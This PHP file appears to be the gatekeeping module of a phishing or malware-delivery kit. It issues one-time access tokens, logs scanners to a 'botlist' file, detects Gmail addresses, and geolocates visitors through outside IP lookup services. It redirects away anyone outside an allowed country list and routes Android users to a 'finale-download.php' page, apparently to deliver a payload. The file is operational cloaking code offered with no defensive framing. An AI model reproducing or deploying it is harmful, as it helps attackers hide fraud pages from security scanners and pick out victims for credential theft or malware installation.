<?php

 //PAGE FUNCTIONS
 function one_time($one_time_access,$redirect){
     
     $test = sha1(session_id());
     include("../past.php");
     
     if($one_time_access == 1){
        if(!isset($_GET['authID']) || $_GET['authID'] != $test){
			markBot("One time","../logz/botlist.txt");
            header("Location: " . $redirect); 
        }elseif(preg_match("/{$_GET['authID']}/i", $past)) {
			markBot("one time","../logz/botlist.txt");
            header("Location: " . redirect_to);
        }else{
            
        }
     }elseif($one_time_access == 0){
         
     }
 }
//one time access

 function ff_process($redirect){
    if(!isset($_GET['start'])){
		markBot("FF","../logz/botlist.txt");
        header("Location: " . redirect_to);
    }else{
        
    }
 }
//0 page stumbling

function detect_g($email){
    $find_me = 'gmail';
    $pos = strpos($email,$find_me);
    
    if($pos === false){
        $detected = 0;
        return $detected;
    }else {
        $detected = 1;
        return $detected;
    }
}
//Google email Detection



function getUserIP(){
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['HTTP_X_REAL_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }

    return $ip;
}



function getOs(){
	$os_platform="Unknown OS";
	$all=array('/windows nt 10/i'=>'Windows 10','/windows nt 6.3/i'=>'Windows 8.1','/windows nt 6.2/i'=>'Windows 8','/windows nt 6.1/i'=>'Windows 7','/windows nt 6.0/i'=>'Windows Vista','/windows nt 5.2/i'=>'Windows Server 2003/XP x64','/windows nt 5.1/i'=>'Windows XP','/windows xp/i'=>'Windows XP','/windows nt 5.0/i'=>'Windows 2000','/windows me/i'=>'Windows ME','/win98/i'=>'Windows 98','/win95/i'=>'Windows 95','/win16/i'=>'Windows 3.11','/macintosh|mac os x/i'=>'Mac OS X','/mac_powerpc/i'=>'Mac OS 9','/linux/i'=>'Linux','/ubuntu/i'=>'Ubuntu','/iphone/i'=>'iPhone','/ipod/i'=>'iPod','/ipad/i'=>'iPad','/android/i'=>'Android','/blackberry/i'=>'BlackBerry','/webos/i'=>'Mobile');
	foreach($all as $regex=>$value){
		if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){$os_platform=$value;}}
		return $os_platform;
	}
//OS Detection System

function getBrowser(){
		$browser="Unknown Browser";
		$all=array('/msie/i'=>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
		foreach($all as $regex=>$value){
			if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){
				$browser=$value;
			}
		}
		return $browser;
	}
//Browser Detection System

function recordToken(){
    $var_str2 = var_export($_SESSION['token'], true);
    $var2 = "<?php\n\n\$past.= $var_str2.',';\n\n?>";
    file_put_contents('./past.php', $var2, FILE_APPEND);
}


//Fuction non Android redirect
function isandroid($redirect){
	$platform = getOs();
    if($platform == "Android"){
		markVisits('../logz/android_view.txt');
        header("location: finale-download.php?locale=en-US&authID={$_SESSION['token']}&start={$_SESSION['fstamp']}&end={$_SESSION['lund']}");
        exit();
    }
}


function markBot($type,$path){
    global $visitor;
    global $visp;
    global $countri;
    global $vcity;
    global $vreg;
	global $platform;
    
    $vaz = "#M : $type | ".gethostbyaddr($_SERVER['REMOTE_ADDR'])." | ".$_SERVER['HTTP_USER_AGENT']." | $visitor | ISP: $visp | LOCATION: $vcity,$vreg| $countri \r\n";
    file_put_contents($path, $vaz, FILE_APPEND);
}

function markVisits($pathy){
    $conten2 = "#> ".getenv("REMOTE_ADDR")." ".$_SERVER['HTTP_USER_AGENT']."\r\n";
    file_put_contents($pathy, $conten2, FILE_APPEND);
}


$user_ip = getenv("REMOTE_ADDR");
$getdetails = "https://extreme-ip-lookup.com/json/".$user_ip."";
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['icountrycode'] = $countryCode   = $details->countryCode;



$ip = $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("https://ip2.app/info.php?ip=".$ip));
$code=$details->code;
$country=$details->country;
$region=$details->region;
$city=$details->city;
$asn=$details->asn;

$_SESSION['icode'] = $code;
$_SESSION['icountry'] = $country;
$_SESSION['icity'] = $city;
$_SESSION['iregion'] = $region;
$_SESSION['iisp'] = $asn;
$_SESSION['browser'] = getBrowser();
$_SESSION['platform'] = getOs();
//IP Lookup for logs


$visitor = getUserIP();
$countri  = $country;
$vcity = $city;
$vreg = $region;
$visp = $asn;
$platform = getOs();



if (true === in_array($code, CTR)) 
   {
   $countrypassed = 1;
   }


else 
    {
	$countrypassed = 0;
    }

if ($countrypassed==0)
    {
		markBot("COUNTRY NOT ALLOWED","../logz/botlist.txt");
		header('location: '. redirect_to);
		die();
    }




?>